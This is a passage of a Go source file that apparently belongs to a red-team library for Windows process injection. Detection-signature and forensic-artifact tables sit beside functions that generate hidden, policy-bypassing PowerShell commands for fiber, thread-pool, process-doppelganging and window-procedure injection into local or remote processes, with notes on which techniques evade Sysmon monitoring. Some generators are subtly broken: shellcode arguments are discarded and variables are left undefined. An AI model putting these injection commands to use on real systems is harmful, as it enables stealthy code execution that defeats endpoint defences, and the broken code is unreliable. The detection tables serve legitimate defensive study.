package processinjection

import "fmt"

var ExtendedForensicArtifactDB = map[string][]ForensicArtifact{
	"F13": {
		{Type: ArtifactEventLog, Description: "ConvertThreadToFiber call - creates fiber for shellcode execution", Location: "ETW kernel thread/fiber events", SysmonEventID: 0, Notes: "Fiber creation is less monitored than thread creation"},
		{Type: ArtifactEventLog, Description: "CreateFiber with shellcode address as start address", Location: "ETW kernel fiber events", SysmonEventID: 0, Notes: "CreateFiber takes a function pointer to execute - this is the injection vector"},
		{Type: ArtifactEventLog, Description: "SwitchToFiber switches execution context to fiber shellcode", Location: "ETW kernel fiber scheduling", SysmonEventID: 0, Notes: "SwitchToFiber is the execution trigger - syscall or kernel32 transition"},
		{Type: ArtifactEventLog, Description: "OpenProcess with PROCESS_ALL_ACCESS (remote variant)", Location: "Sysmon EventID 10", SysmonEventID: 10, Notes: "Handle to target process for remote fiber injection"},
		{Type: ArtifactEventLog, Description: "CreateRemoteThread to fiber conversion chain (remote variant)", Location: "Sysmon EventID 8", SysmonEventID: 8, Notes: "Sysmon EventID 8 fires for CreateRemoteThread in remote variant"},
		{Type: ArtifactMemory, Description: "Fiber data structures (FIBERCONTEXT) in process heap", Location: "Process heap - fiber context allocations", SysmonEventID: 0, Notes: "Fiber structures contain stack and context pointers - forensically identifiable"},
		{Type: ArtifactMemory, Description: "Shellcode in allocated RWX memory", Location: "VirtualAlloc region", SysmonEventID: 0, Notes: "Shellcode allocated with execute permissions for fiber callback"},
		{Type: ArtifactEventLog, Description: "AMSI scan of PowerShell executing fiber injection", Location: "AMSI ETW EventID 1105", SysmonEventID: 0, Notes: "Windows Defender AMSI scans PowerShell scripts"},
	},
	"F14": {
		{Type: ArtifactEventLog, Description: "CreateThreadpoolWait/CreateThreadpoolWork/CreateThreadpoolTimer with shellcode callback", Location: "ETW kernel thread pool events", SysmonEventID: 0, Notes: "Thread pool object creation with non-standard callback pointers"},
		{Type: ArtifactEventLog, Description: "SetThreadpoolWait/SubmitThreadpoolWork/SetThreadpoolTimer triggers callback execution", Location: "ETW kernel thread pool scheduling", SysmonEventID: 0, Notes: "Thread pool callback scheduling activates the shellcode"},
		{Type: ArtifactEventLog, Description: "OpenProcess with PROCESS_ALL_ACCESS (remote variant)", Location: "Sysmon EventID 10", SysmonEventID: 10, Notes: "Handle to target process"},
		{Type: ArtifactEventLog, Description: "VirtualAllocEx/WriteProcessMemory to remote process", Location: "ETW kernel memory events", SysmonEventID: 0, Notes: "Shellcode written to remote process memory"},
		{Type: ArtifactMemory, Description: "TP_DIRECT structures and thread pool callback lists", Location: "ntdll!TP_DIRECT structures in heap", SysmonEventID: 0, Notes: "Thread pool structures contain callback function pointers"},
		{Type: ArtifactMemory, Description: "Shellcode in executable memory within thread pool context", Location: "VirtualAlloc region in target process", SysmonEventID: 0, Notes: "Thread pool callbacks pointing to allocated memory"},
		{Type: ArtifactEventLog, Description: "Sysmon EventID 8 NOT triggered - no CreateRemoteThread needed", Location: "Sysmon EventID 8 - deliberately absent", SysmonEventID: 8, Notes: "Key evasion: thread pool uses existing worker threads, not CreateRemoteThread"},
		{Type: ArtifactEventLog, Description: "Thread pool worker thread executes callback from non-image memory", Location: "ETW Microsoft-Windows-Kernel-Process", SysmonEventID: 0, Notes: "Thread start address in thread pool worker not backed by loaded module"},
	},
	"F15": {
		{Type: ArtifactEventLog, Description: "CreateTransaction called to create NTFS transaction", Location: "ETW kernel transaction events (Microsoft-Windows-Kernel-File)", SysmonEventID: 0, Notes: "TxF transaction creation monitored by some EDRs"},
		{Type: ArtifactEventLog, Description: "CreateFileTransacted within transaction context", Location: "Sysmon EventID 11", SysmonEventID: 11, Notes: "File created within transaction - if file monitoring sees this"},
		{Type: ArtifactEventLog, Description: "WriteFile to transacted file (payload written to temp file in TxF)", Location: "ETW kernel file I/O events", SysmonEventID: 0, Notes: "Payload PE written inside transaction - not visible on disk until commit"},
		{Type: ArtifactEventLog, Description: "CreateFileMapping/NtCreateSection from transacted file handle", Location: "ETW kernel section events", SysmonEventID: 0, Notes: "Section object created from transacted file - key forensic step"},
		{Type: ArtifactEventLog, Description: "RollbackTransaction - file disappears from disk but section remains", Location: "ETW kernel transaction events", SysmonEventID: 0, Notes: "File rolled back - no trace on disk but section object still holds payload"},
		{Type: ArtifactEventLog, Description: "NtCreateProcessEx with section handle - process created from section", Location: "EventID 4688", SysmonEventID: 1, Notes: "Process Creation event - new process created from section object"},
		{Type: ArtifactEventLog, Description: "Process Tampering - process created from modified image", Location: "Sysmon EventID 25", SysmonEventID: 25, Notes: "Sysmon EventID 25 detects process image size/checksum modifications"},
		{Type: ArtifactEventLog, Description: "SetThreadContext to set entry point in doppelganged process", Location: "ETW Microsoft-Windows-Kernel-Process", SysmonEventID: 0, Notes: "Thread context modification to redirect execution to payload"},
		{Type: ArtifactMemory, Description: "Section-backed memory with modified PE image", Location: "Process memory (section object from rolled-back TxF)", SysmonEventID: 0, Notes: "Memory-backed PE without corresponding file on disk - key forensic indicator"},
		{Type: ArtifactFileSystem, Description: "TxF transaction metadata in $TxF log", Location: "C:\\$Extend\\$TxF:\\$TxfLog.blf", SysmonEventID: 0, Notes: "TxF journal contains transaction records even after rollback"},
		{Type: ArtifactRegistry, Description: "Transaction GUID in kernel transaction manager", Location: "HKLM\\SYSTEM\\CurrentControlSet\\Control\\TxF\\", SysmonEventID: 0, Notes: "TxF registry keys track active/committed transactions"},
	},
	"F16": {
		{Type: ArtifactEventLog, Description: "FindWindow/EnumWindows to locate target window handle", Location: "ETW user32 window enumeration", SysmonEventID: 0, Notes: "Window enumeration may be logged if ETW user32 tracing enabled"},
		{Type: ArtifactEventLog, Description: "SetWindowLongPtr with GWLP_WNDPROC to shellcode address", Location: "ETW user32 window property changes", SysmonEventID: 0, Notes: "Changing window procedure to non-standard code address"},
		{Type: ArtifactEventLog, Description: "CallWindowProc with window handle triggers shellcode execution", Location: "ETW user32 callbacks", SysmonEventID: 0, Notes: "CallWindowProc invokes the replaced window procedure"},
		{Type: ArtifactEventLog, Description: "OpenProcess with PROCESS_ALL_ACCESS (remote variant)", Location: "Sysmon EventID 10", SysmonEventID: 10, Notes: "Handle to target process for remote window enumeration"},
		{Type: ArtifactMemory, Description: "Shellcode in RWX memory, pointed to by Extra Window Memory bytes", Location: "VirtualAlloc region", SysmonEventID: 0, Notes: "Window class extra memory stores pointer to shellcode"},
		{Type: ArtifactEventLog, Description: "No CreateRemoteThread - window message loop acts as execution trigger", Location: "Sysmon EventID 8 - deliberately absent", SysmonEventID: 8, Notes: "No remote thread creation - evades Sysmon EventID 8"},
		{Type: ArtifactEventLog, Description: "Window message sent to trigger CallWindowProc", Location: "ETW user32 message events", SysmonEventID: 0, Notes: "SendMessage/PostMessage triggers the window procedure change"},
	},
	"F17": {
		{Type: ArtifactEventLog, Description: "OpenProcess with PROCESS_ALL_ACCESS to target process", Location: "Sysmon EventID 10", SysmonEventID: 10, Notes: "Handle to target process for module enumeration and writing"},
		{Type: ArtifactEventLog, Description: "VirtualProtectEx changing target module .text section to RWX", Location: "ETW kernel memory events", SysmonEventID: 0, Notes: "Code section permissions changed from RX to RWX - highly anomalous"},
		{Type: ArtifactEventLog, Description: "WriteProcessMemory overwriting target module .text section", Location: "ETW kernel memory events", SysmonEventID: 0, Notes: "Modifying code section of a loaded module is a strong indicator"},
		{Type: ArtifactEventLog, Description: "CreateRemoteThread at module entry point after code replacement", Location: "Sysmon EventID 8", SysmonEventID: 8, Notes: "Thread starting at module entry point but code has been replaced with shellcode"},
		{Type: ArtifactEventLog, Description: "VirtualProtectEx restoring .text to RX after shellcode written", Location: "ETW kernel memory events", SysmonEventID: 0, Notes: "Permissions restored to RX after modification - classic module stomping pattern"},
		{Type: ArtifactMemory, Description: "Module .text section integrity check failure", Location: "Verified module hash vs calculated hash", SysmonEventID: 0, Notes: "Module code does not match known good hash - memory scanning detects this"},
		{Type: ArtifactMemory, Description: "Module appears loaded in module list but code differs from disk", Location: "Process module list (PEB->Ldr)", SysmonEventID: 0, Notes: "Module listing shows legitimate DLL but code is shellcode"},
		{Type: ArtifactEventLog, Description: "No new image load event (Sysmon EventID 7 absent)", Location: "Sysmon EventID 7 - deliberately absent", SysmonEventID: 7, Notes: "No new DLL loaded - existing module is modified in-place"},
	},
	"F18": {
		{Type: ArtifactEventLog, Description: "CreateThreadpoolWork with fiber conversion callback", Location: "ETW kernel thread pool events", SysmonEventID: 0, Notes: "Thread pool work item created with non-standard callback"},
		{Type: ArtifactEventLog, Description: "SubmitThreadpoolWork triggers thread pool worker", Location: "ETW kernel thread pool scheduling", SysmonEventID: 0, Notes: "Work item submitted to thread pool for execution"},
		{Type: ArtifactEventLog, Description: "ConvertThreadToFiber within thread pool worker context", Location: "ETW kernel fiber events", SysmonEventID: 0, Notes: "Fiber creation from thread pool thread - unusual combination"},
		{Type: ArtifactEventLog, Description: "CreateFiber from thread pool worker thread", Location: "ETW kernel fiber events", SysmonEventID: 0, Notes: "Fiber created inside thread pool execution context"},
		{Type: ArtifactEventLog, Description: "SwitchToFiber executes shellcode in fiber context", Location: "ETW kernel fiber scheduling", SysmonEventID: 0, Notes: "Fiber switch executes shellcode from thread pool context"},
		{Type: ArtifactMemory, Description: "Shellcode in executable memory with fiber structures", Location: "VirtualAlloc region + fiber context data", SysmonEventID: 0, Notes: "Combined fiber + thread pool memory artifacts"},
		{Type: ArtifactEventLog, Description: "No CreateRemoteThread - uses thread pool workers", Location: "Sysmon EventID 8 - deliberately absent", SysmonEventID: 8, Notes: "No new thread created - execution in existing thread pool thread"},
		{Type: ArtifactEventLog, Description: "Thread start in non-image memory with fiber structures", Location: "ETW Microsoft-Windows-Kernel-Process", SysmonEventID: 0, Notes: "Thread pool worker thread executing from non-standard memory"},
	},
}

func InjectFiber(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return `-NoP -NonI -W Hidden -Exec Bypass -C `+
		`"$buf=[byte[]]@(0x%%s); `+
		`$va=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
		`[Func[int,int,int,int,int]]); `+
		`$p=$va.Invoke(0,$buf.Length,0x3000,0x40); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,$buf.Length); `+
		`$ctf=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'ConvertThreadToFiber'),`+
		`[Func[IntPtr,IntPtr]]); `+
		`$fiber=$ctf.Invoke(0); `+
		`$cf=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'CreateFiber'),`+
		`[Func[int,IntPtr,IntPtr,IntPtr]]); `+
		`$newFiber=$cf.Invoke(0,$p,0); `+
		`$sf=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'SwitchToFiber'),`+
		`[Func[IntPtr,int]]); `+
		`$sf.Invoke($newFiber)"`, nil
}

func InjectFiberRemote(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$fn=[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateThreadEx'); `+
			`$del=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fn,[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$fiberStub=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x2000,0x3000,0x40); `+
			`$fiberCode=[byte[]]@(0x48,0x83,0xEC,0x28,0x48,0xB8); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$fiberStub,$fiberCode,$fiberCode.Length,[ref]0); `+
			`$del.Invoke($h,0,0,$fiberStub,0,0,0,0,0,0)"`,
		targetPID,
	), nil
}

func FiberAPIMap() map[int]string {
	return map[int]string{
		1: "VirtualAlloc(NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> lpShellcode",
		2: "RtlCopyMemory(lpShellcode, shellcode, dwSize) -> write shellcode to RWX memory",
		3: "ConvertThreadToFiber(NULL) -> hCurrentFiber (convert main thread to fiber container)",
		4: "CreateFiber(0, lpShellcode, NULL) -> hFiber (new fiber with shellcode entry point)",
		5: "SwitchToFiber(hFiber) -> execution context switches to fiber, shellcode runs",
		6: "After shellcode: SwitchToFiber(hCurrentFiber) -> return to main fiber (optional)",
		7: "DeleteFiber(hFiber) -> cleanup fiber resources (optional for persistence)",
		8: "Remote variant: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread with fiber stub",
	}
}

func FiberDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":           "CreateRemoteThread if remote fiber injection variant used",
		"Sysmon EventID 10":          "ProcessAccess detected for OpenProcess in remote variant",
		"EventID 4688":               "Process Creation NOT relevant for local fiber injection",
		"ETW Microsoft-Windows-Kernel-Process": "Fiber creation (ConvertThreadToFiber/CreateFiber) can be traced via kernel ETW",
		"CrowdStrike Falcon":         "CS detects via fiber creation callbacks and non-standard fiber entry points",
		"SentinelOne":                "S1 monitors for ConvertThreadToFiber + CreateFiber + SwitchToFiber chains as suspicious",
		"Microsoft Defender":         "MDE detects via fiber API telemetry and shellcode execution via fiber context",
		"Elastic EDR":                "Elastic detects via 'Windows Fiber Injection' rule - fiber creation with callbacks to non-image memory",
		"Memory Scan":                "Fiber data structures (FIBERCONTEXT) identifiable in process heap - stack, context, entry point fields",
	}
}

func InjectThreadPoolWait(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$kernel32=[PoshWin32.Kernel32]::GetModuleHandle('kernel32'); `+
			`$ctpw=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'CreateThreadpoolWait'),`+
			`[Func[IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$pwait=$ctpw.Invoke($addr,0,0); `+
			`$ev=[PoshWin32.Kernel32]::CreateEvent(0,0,0,0); `+
			`$stw=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'SetThreadpoolWait'),`+
			`[Func[IntPtr,IntPtr,IntPtr,int]]); `+
			`$stw.Invoke($pwait,$ev,0); `+
			`[PoshWin32.Kernel32]::SetEvent($ev)"`,
		targetPID,
	), nil
}

func InjectThreadPoolWork(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$kernel32=[PoshWin32.Kernel32]::GetModuleHandle('kernel32'); `+
			`$ctpw=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'CreateThreadpoolWork'),`+
			`[Func[IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$pwork=$ctpw.Invoke($addr,0,0); `+
			`$stpw=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'SubmitThreadpoolWork'),`+
			`[Func[IntPtr,int]]); `+
			`$stpw.Invoke($pwork)"`,
		targetPID,
	), nil
}

func InjectThreadPoolTimer(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$kernel32=[PoshWin32.Kernel32]::GetModuleHandle('kernel32'); `+
			`$ctpt=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'CreateThreadpoolTimer'),`+
			`[Func[IntPtr,IntPtr,IntPtr,IntPtr]]); `+
			`$ptimer=$ctpt.Invoke($addr,0,0); `+
			`$stpt=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($kernel32,'SetThreadpoolTimer'),`+
			`[Func[IntPtr,IntPtr,IntPtr,int,int]]); `+
			`$ft=[long](-10000000); `+
			`$stpt.Invoke($ptimer,$ft,0,0)"`,
		targetPID,
	), nil
}

func ThreadPoolAPIMap() map[int]string {
	return map[int]string{
		1: "OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID) -> hProcess (remote variant)",
		2: "VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) -> lpRemoteAddr",
		3: "WriteProcessMemory(hProcess, lpRemoteAddr, shellcode, dwSize, NULL) -> write shellcode",
		4: "Wait variant: CreateThreadpoolWait(lpRemoteAddr, NULL, NULL) -> pWait",
		5: "Wait variant: CreateEvent(NULL, FALSE, FALSE, NULL) -> hEvent",
		6: "Wait variant: SetThreadpoolWait(pWait, hEvent, NULL) -> register callback on event",
		7: "Wait variant: SetEvent(hEvent) -> trigger callback, thread pool executes shellcode",
		8: "Work variant: CreateThreadpoolWork(lpRemoteAddr, NULL, NULL) -> pWork",
		9: "Work variant: SubmitThreadpoolWork(pWork) -> schedule work item, thread pool executes shellcode",
		10: "Timer variant: CreateThreadpoolTimer(lpRemoteAddr, NULL, NULL) -> pTimer",
		11: "Timer variant: SetThreadpoolTimer(pTimer, &dueTime, 0, 0) -> schedule timer, fires callback",
		12: "All variants: No CreateRemoteThread - uses existing thread pool worker threads for stealth",
	}
}

func ThreadPoolDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 8":           "NOT triggered - no CreateRemoteThread, uses thread pool workers (key evasion)",
		"Sysmon EventID 10":          "ProcessAccess detected for OpenProcess in remote variant",
		"EventID 4688":               "Process Creation NOT relevant",
		"ETW Microsoft-Windows-Kernel-ThreadPool": "Thread pool callback registration with non-standard callbacks captured via ETW",
		"CrowdStrike Falcon":         "CS detects via thread pool callback kernel callbacks with pointers to non-image memory",
		"SentinelOne":                "S1 monitors for CreateThreadpoolWait/Work/Timer with callbacks to VirtualAlloc regions",
		"Microsoft Defender":         "MDE detects via TP_DIRECT structure analysis - callbacks pointing to allocated memory",
		"Elastic EDR":                "Elastic detects via 'Thread Pool Injection' rule - suspicious thread pool callbacks",
		"Memory Scan":                "TP_DIRECT structures contain callback function pointers - memory scanners enumerate these",
	}
}

func InjectDoppelganging(targetExePath string, payload []byte) (string, error) {
	if targetExePath == "" {
		return "", fmt.Errorf("empty target executable path")
	}
	if len(payload) == 0 {
		return "", fmt.Errorf("empty payload")
	}
	_ = payload
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$ct=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateTransaction'),`+
			`[Func[IntPtr,IntPtr,int,IntPtr,IntPtr,IntPtr,int,int,int,IntPtr]]); `+
			`$tx=[IntPtr]::Zero; $ct.Invoke([ref]$tx,0,0x00120001,0,0,0,0,0,0,0); `+
			`$cft=[PoshWin32.Kernel32]::CreateFileTransacted('%s',0x40000000,0,0,2,0x80,0,$tx); `+
			`[PoshWin32.Kernel32]::WriteFile($cft,$payload,$payload.Length,[ref]0,0); `+
			`$sf=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateSection'),`+
			`[Func[IntPtr,int,IntPtr,IntPtr,int,int,IntPtr]]); `+
			`$sec=[IntPtr]::Zero; $sf.Invoke([ref]$sec,0x000F001F,0,[IntPtr]::Zero,0x40,0x08000000,$cft); `+
			`$rt=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'RollbackTransaction'),`+
			`[Func[IntPtr,int]]); `+
			`$rt.Invoke($tx); `+
			`$cpe=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateProcessEx'),`+
			`[Func[IntPtr,int,IntPtr,IntPtr,int,IntPtr,IntPtr,int,IntPtr,IntPtr]]); `+
			`$ph=[IntPtr]::Zero; $cpe.Invoke([ref]$ph,0x001FFFFF,0,0,2,$sec,0,0,0,0); `+
			`[PoshWin32.Kernel32]::ResumeThread($ph)"`,
		targetExePath,
	), nil
}

func InjectDoppelgangingFromDisk(targetExePath string, payloadPath string) (string, error) {
	if targetExePath == "" {
		return "", fmt.Errorf("empty target executable path")
	}
	if payloadPath == "" {
		return "", fmt.Errorf("empty payload path")
	}
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$payloadBytes=[System.IO.File]::ReadAllBytes('%s'); `+
			`$ntdll=[PoshWin32.Kernel32]::GetModuleHandle('ntdll'); `+
			`$ct=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateTransaction'),`+
			`[Func[IntPtr,IntPtr,int,IntPtr,IntPtr,IntPtr,int,int,int,IntPtr]]); `+
			`$tx=[IntPtr]::Zero; $ct.Invoke([ref]$tx,0,0x00120001,0,0,0,0,0,0,0); `+
			`$cft=[PoshWin32.Kernel32]::CreateFileTransacted('%s',0x40000000,0,0,2,0x80,0,$tx); `+
			`[PoshWin32.Kernel32]::WriteFile($cft,$payloadBytes,$payloadBytes.Length,[ref]0,0); `+
			`$sf=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateSection'),`+
			`[Func[IntPtr,int,IntPtr,IntPtr,int,int,IntPtr]]); `+
			`$sec=[IntPtr]::Zero; $sf.Invoke([ref]$sec,0x000F001F,0,[IntPtr]::Zero,0x40,0x08000000,$cft); `+
			`[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'RollbackTransaction'),`+
			`[Func[IntPtr,int]]).Invoke($tx); `+
			`[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress($ntdll,'NtCreateProcessEx'),`+
			`[Func[IntPtr,int,IntPtr,IntPtr,int,IntPtr,IntPtr,int,IntPtr,IntPtr]]).Invoke(`+
			`[ref]([IntPtr]::Zero),0x001FFFFF,0,0,2,$sec,0,0,0,0); `+
			`[PoshWin32.Kernel32]::ResumeThread(($ph=[IntPtr]::Zero))"`,
		payloadPath, targetExePath,
	), nil
}

func DoppelgangingAPIMap() map[int]string {
	return map[int]string{
		1: "NtCreateTransaction(&hTx, ..., 0x00120001, ...) -> create NTFS transaction handle",
		2: "CreateFileTransacted(targetPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE, NULL, hTx) -> hFile in transaction",
		3: "WriteFile(hFile, payloadPE, payloadSize, &bytesWritten, NULL) -> write payload to transacted file",
		4: "NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE, SEC_IMAGE, hFile) -> section from transacted file",
		5: "RollbackTransaction(hTx) -> file disappears from disk (transaction rolled back)",
		6: "Section still exists with payload PE image (key evasion point)",
		7: "NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, NULL, 2, hSection, NULL, 0, NULL, NULL) -> process created from section",
		8: "NtCreateThreadEx(&hThread, ..., hProcess, entryPoint, ...) -> start thread in doppelganged process",
		9: "SetThreadContext + ResumeThread -> payload executes in context of the phantom process",
	}
}

func DoppelgangingDetectionSignatures() map[string]string {
	return map[string]string{
		"Sysmon EventID 1":           "Process Creation - doppelganged process appears with legitimate image path",
		"Sysmon EventID 10":          "ProcessAccess - handle operations to target process",
		"Sysmon EventID 11":          "FileCreate - transacted file creation (may be visible depending on file system filter driver)",
		"Sysmon EventID 25":          "ProcessTampering - process created from modified PE (image size/checksum mismatch)",
		"EventID 4688":               "Process Creation - doppelganged process creation audit event",
		"EventID 4656":               "Handle to Object - transaction and section handle operations",
		"CrowdStrike Falcon":         "CS detects via NtCreateSection + NtCreateProcessEx chain with transacted file handle",
		"SentinelOne":                "S1 detects via process creation from section-backed memory without backing file on disk",
		"Microsoft Defender":         "MDE detects via TxF transaction + process creation anomaly chain",
		"Elastic EDR":                "Elastic detects via 'Process Doppelgänging' rule - TxF transaction + process creation from section",
		"Memory Scan":                "PE image in process memory without corresponding file mapping (file-backed but file rolled back)",
		"$TxF Log":                   "TxF transaction log ($TxfLog.blf) contains records of rolled-back transaction - key forensic evidence",
	}
}

func InjectExtraWindowMemory(hwnd int, shellcode []byte) (string, error) {
	if hwnd <= 0 {
		return "", fmt.Errorf("invalid window handle: %d", hwnd)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	_ = hwnd
	return `-NoP -NonI -W Hidden -Exec Bypass -C `+
		`"$buf=[byte[]]@(0x%%s); `+
		`$va=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('kernel32'),'VirtualAlloc'),`+
		`[Func[int,int,int,int,int]]); `+
		`$p=$va.Invoke(0,$buf.Length,0x3000,0x40); `+
		`[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,$buf.Length); `+
		`$h=[PoshWin32.Kernel32]::FindWindowA('Notepad',0); `+
		`[PoshWin32.Kernel32]::SetWindowLongPtr($h,-4,$p); `+
		`$cwp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
		`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('user32'),'CallWindowProcW'),`+
		`[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,int]]); `+
		`$cwp.Invoke($p,$h,0,0,0)"`, nil
}

func InjectExtraWindowMemoryRemote(targetPID int, shellcode []byte) (string, error) {
	if targetPID <= 0 {
		return "", fmt.Errorf("invalid target PID: %d", targetPID)
	}
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}
	_ = shellcode
	return fmt.Sprintf(
		`-NoP -NonI -W Hidden -Exec Bypass -C `+
			`"$p=Get-Process -Id %d; `+
			`$h=[PoshWin32.Kernel32]::OpenProcess(0x001F0FFF,$false,$p.Id); `+
			`$addr=[PoshWin32.Kernel32]::VirtualAllocEx($h,0,0x1000,0x3000,0x40); `+
			`[PoshWin32.Kernel32]::WriteProcessMemory($h,$addr,$payload,$payload.Length,[ref]0); `+
			`$ew=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(`+
			`[PoshWin32.Kernel32]::GetProcAddress([PoshWin32.Kernel32]::GetModuleHandle('user32'),'EnumWindows'),`+
			`[Func[IntPtr,IntPtr,int]]); `+
